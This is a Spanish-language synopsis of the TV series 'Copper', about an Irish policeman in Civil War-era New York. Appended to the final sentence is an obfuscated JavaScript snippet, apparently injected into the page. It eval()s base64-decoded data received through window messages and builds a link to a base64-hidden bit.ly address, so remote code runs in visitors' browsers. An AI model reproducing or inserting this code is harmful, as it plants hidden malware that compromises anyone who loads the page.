Descripcion
Copper es una serie protagonizada por un policía de origen irlandés que trabaja en la ciudad de Nueva York en el siglo XIX. La mayor parte de la acción de la serie tiene lugar en el amable barrio de inmigrantes irlandeses de Five Points, pero frecuentemente visita las mansiones del Upper East Side y la Quinta Avenida, así como el emergente vecindario de Harlem, fundado por la incipiente población afroamericana. Fiel a las mejores series policiacas de la televisión, Copper ofrecerá historias bien construidas, misterios e investigaciones policiales cerradas, llenas de trampas, giros y sorpresas.
Ambientada en la Nueva York de 1860, las tramas relacionadas con la Guerra Civil vertebran la serie, mientras se exploran temáticas como el poder, la política y la raza, en un país y una comunidad que vive un frenético cambio social. Todo ello, visto desde la óptica de Kevin Corcoran (Tom Weston-Jones, MI-5), un joven, tosco y confiado policía de origen irlandés que patrulla las calles del barrio de Five Points y que se esfuerza en mantener su brújula moral, a pesar de la complicada realidad a la que se enfrenta en su turbulenta comunidad. Cada semana, nos uniremos a su emotiva e incansable búsqueda para averiguar la verdad que se esconde tras la desaparición de su esposa y la muerte de su hija.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

